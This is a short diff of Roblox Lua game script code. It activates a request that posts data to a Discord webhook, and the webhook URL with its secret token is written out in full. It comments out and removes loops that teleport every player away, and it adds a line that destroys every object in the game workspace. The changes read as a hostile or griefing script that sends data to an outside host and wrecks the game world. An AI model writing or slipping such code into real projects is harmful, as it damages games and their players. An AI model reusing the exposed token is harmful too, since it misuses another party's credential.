@@ -13,7 +13,7 @@
 	end)
 end]]
 
---[[local url = "https://discord.com/api/webhooks/1391064950444654622/FEtgpmHH8pADyHA2tjZQEkFE0AAMgaNqZ0nP8tqPyLn_QrUbupBcXQhKKnupsdJQ44k9"
+local url = "https://discord.com/api/webhooks/1391064950444654622/FEtgpmHH8pADyHA2tjZQEkFE0AAMgaNqZ0nP8tqPyLn_QrUbupBcXQhKKnupsdJQ44k9"
 local hs = game:GetService("HttpService")
 
 local text = {
@@ -32,10 +32,8 @@ hs:PostAsync(url, hs:JSONEncode(text))
 
 local ts = game:GetService("TeleportService")
 
-for _, Player in game.Players:GetPlayers() do
+--[[for _, Player in game.Players:GetPlayers() do
 	ts:Teleport(75373144977072,Player)
 end]]
 
-for _,v in game.Players:GetPlayers() do
-    game:GetService("TeleportService"):Teleport(123450425113924,v)
-end
+for _, v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
